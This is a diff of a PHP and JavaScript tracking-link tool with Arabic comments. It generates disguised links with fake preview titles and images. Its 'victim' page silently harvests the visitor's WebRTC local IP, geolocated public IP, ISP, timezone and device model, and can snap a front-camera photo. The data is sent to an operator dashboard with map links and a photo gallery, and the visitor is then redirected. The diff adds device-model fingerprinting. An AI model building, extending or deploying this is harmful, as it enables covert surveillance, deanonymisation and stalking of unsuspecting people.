@@ -10,7 +10,7 @@ try {
     $db = new PDO('sqlite:tracker.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // تحديث جدول الروابط ليدعم خاصية تفعيل/إلغاء الكاميرا
+    // جدول الروابط مع خيار تفعيل الكاميرا
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -33,12 +33,12 @@ try {
         lon TEXT, 
         isp TEXT, 
         device_info TEXT, 
-        screen_res TEXT, 
+        device_model TEXT, 
         timezone TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // جدول خاص بتخزين الصور الملتقطة
+    // جدول تخزين الصور الملتقطة
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -142,6 +142,9 @@ function get_device_type($ua) {
     elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
     elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
     elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
+    elseif (stripos($ua, 'Realme') !== false) $brand = 'Realme';
+    elseif (stripos($ua, 'Infinix') !== false) $brand = 'Infinix';
+    elseif (stripos($ua, 'Tecno') !== false) $brand = 'Tecno';
 
     if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
     if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
@@ -181,18 +184,20 @@ if (isset($_GET['r'])) {
 
     if ($link) {
         $target_redirect = $link['target_url'];
-        $og_title =$link['meta_title'];
-        $og_image =$link['meta_image'];
-        $link_use_cam =$link['use_cam'];
+        $og_title = $link['meta_title'];
+        $og_image = $link['meta_image'];
+        $link_use_cam = $link['use_cam'];
 
         // حفظ سجلات الـ IP والبيانات في الخلفية
-        if (isset($_GET['save_log']) &&$_GET['save_log'] == '1') {
-            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? $public_ip;
-            $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
+        if (isset($_GET['save_log']) && $_GET['save_log'] == '1') {
+            $public_ip = get_real_ip();
+            $local_ip = $_GET['lip'] ?? 'Cellular / Direct';
+            $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';
+            $geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$device_model = $_GET['dmodel'] ?? 'Unknown Model';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
 
             try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, device_model, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$device_model, $tz,$created_at]);
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -248,7 +253,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية (تعمل حسب خيار الكاميرا المفعل للرابط)
+// واجهة الضحية
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -272,7 +277,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
             let foundLocal = false;
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             if (!RTCPeerConnection) {
-                fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Unknown"));
+                callback("Cellular / Direct");
                 return;
             }
             let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
@@ -294,67 +299,95 @@ if (isset($_GET['r']) && !empty($target_redirect)):
             };
             setTimeout(() => {
                 if (!foundLocal) {
-                    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Direct"));
+                    callback("Cellular / Direct");
                 }
-            }, 80);
+            }, 100);
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
+        // استخراج اسم ورطة موديل الجهاز الحقيقي عبر المتصفح
+        function getDeviceModel() {
+            let ua = navigator.userAgent;
+            let model = "Unknown Model";
+            
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                return navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"])
+                    .then(uaData => {
+                        return uaData.model ? uaData.model : getFallbackModel(ua);
+                    })
+                    .catch(() => getFallbackModel(ua));
+            }
+            return Promise.resolve(getFallbackModel(ua));
+        }
+
+        function getFallbackModel(ua) {
+            let match = ua.match(/\(([^)]+)\)/);
+            if (match && match[1]) {
+                let parts = match[1].split(';');
+                for (let p of parts) {
+                    p = p.trim();
+                    if (p.includes("Build/") || p.includes("iPhone") || p.includes("iPad") || p.includes("SM-") || p.includes("Redmi") || p.includes("Pixel")) {
+                        return p;
+                    }
+                }
+                return parts[parts.length - 1] || "Web Browser";
+            }
+            return "Standard Device";
+        }
+
+        document.addEventListener("DOMContentLoaded", async function() {
             const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
             const targetUrl = "<?php echo $target_redirect; ?>";
 
-            // جمع بيانات الـ IP والشاشة في الخلفية فوراً
+            let deviceModel = await getDeviceModel();
+
             getLocalIP(function(localIp) {
-                const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const logUrl = `/?r=${redirectCode}&save_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                const logUrl = `/?r=${redirectCode}&save_log=1&lip=${encodeURIComponent(localIp)}&dmodel=${encodeURIComponent(deviceModel)}&tz=${encodeURIComponent(tz)}`;
                 
                 if (navigator.sendBeacon) {
                     navigator.sendBeacon(logUrl);
                 } else {
                     fetch(logUrl, { method: 'GET', keepalive: true });
                 }
-            });
 
-            // إذا كان مفعل تفعيل الكاميرا لهذا الرابط
-            if (useCam === 1) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 640;
-                            canvas.height = 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                if (useCam === 1) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                        .then(stream => {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
                             
-                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                            stream.getTracks().forEach(track => track.stop());
+                            setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 640;
+                                canvas.height = 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                                stream.getTracks().forEach(track => track.stop());
 
-                            const formData = new URLSearchParams();
-                            formData.append('save_capture', '1');
-                            formData.append('image', imageData);
+                                const formData = new URLSearchParams();
+                                formData.append('save_capture', '1');
+                                formData.append('image', imageData);
 
-                            fetch(`/?r=${redirectCode}`, {
-                                method: 'POST',
-                                body: formData
-                            }).finally(() => {
-                                window.location.replace(targetUrl);
-                            });
-                        }, 800);
-                    })
-                    .catch(err => {
+                                fetch(`/?r=${redirectCode}`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).finally(() => {
+                                    window.location.replace(targetUrl);
+                                });
+                            }, 800);
+                        })
+                        .catch(err => {
+                            window.location.replace(targetUrl);
+                        });
+                } else {
+                    setTimeout(function() {
                         window.location.replace(targetUrl);
-                    });
-            } else {
-                // إذا لم تكن الكاميرا مفعلة، يتم التوجيه فورا بعد تسجيل البيانات
-                setTimeout(function() {
-                    window.location.replace(targetUrl);
-                }, 200);
-            }
+                    }, 300);
+                }
+            });
         });
     </script>
 </head>
@@ -432,8 +465,8 @@ endif;
         .ip-public { font-family: monospace; color: #38bdf8; }
         .ip-local { font-family: monospace; color: #34d399; }
         .port-tag { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 2px 6px; border-radius: 4px; }
+        .model-tag { color: #facc15; font-weight: 500; font-family: monospace; }
 
-        /* معرض الصور */
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; margin-top: 15px; }
         .card-img { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; padding: 10px; text-align: center; }
         .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
@@ -468,7 +501,6 @@ endif;
 <body>
     <div class="wrapper">
         
-        <!-- قسم توليد الروابط -->
         <section class="section-box">
             <h2>توليد رابط تعقب جديد</h2>
             <form method="POST" class="form-row">
@@ -503,7 +535,6 @@ endif;
             <?php endif; ?>
         </section>
 
-        <!-- قسم السجلات الحية -->
         <section class="section-box">
             <div class="toolbar">
                 <h2>سجلات الزيارات والتحليلات الحية</h2>
@@ -526,10 +557,10 @@ endif;
                             <th>IP العام</th>
                             <th>IP المحلي</th>
                             <th>المنفذ</th>
-                            <th>الجهاز</th>
+                            <th>نوع النظام</th>
+                            <th>طراز الجهاز (Model)</th>
                             <th>الموقع الجغرافي</th>
                             <th>مزود الخدمة</th>
-                            <th>الشاشة والمنطقة</th>
                             <th>الوقت (التوقيت الجزائري)</th>
                         </tr>
                     </thead>
@@ -547,12 +578,12 @@ endif;
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? 'N/A'); ?></td>
                                 <td><span class="port-tag"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                 <td style="font-weight: 500; color: #f8fafc;"><?php echo htmlspecialchars($log['device_info']); ?></td>
+                                <td class="model-tag"><?php echo htmlspecialchars($log['device_model'] ?? 'N/A'); ?></td>
                                 <td>
                                     <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
                                     <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #38bdf8; text-decoration: none;">عرض الخريطة ↗</a>
                                 </td>
                                 <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
-                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
                                 <td style="color: #10b981; font-weight: 500;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                             </tr>
                             <?php endforeach; ?>
@@ -561,7 +592,6 @@ endif;
                 </table>
             </div>
 
-            <!-- معرض الصور الملتقطة للروابط التي تم تفعيل الكاميرا لها -->
             <h2 style="margin-top: 10px;">معرض الصور الملتقطة للكاميرا</h2>
             <?php if (empty($captures)): ?>
                 <p style="text-align: center; color: var(--text-muted); padding: 20px;">لا توجد أي صور ملتقطة حتى الآن.</p>
@@ -584,7 +614,6 @@ endif;
 
     </div>
 
-    <!-- التذييل -->
     <footer>
         <p>Powered by <span>azeez</span> &copy; 2026</p>
     </footer>
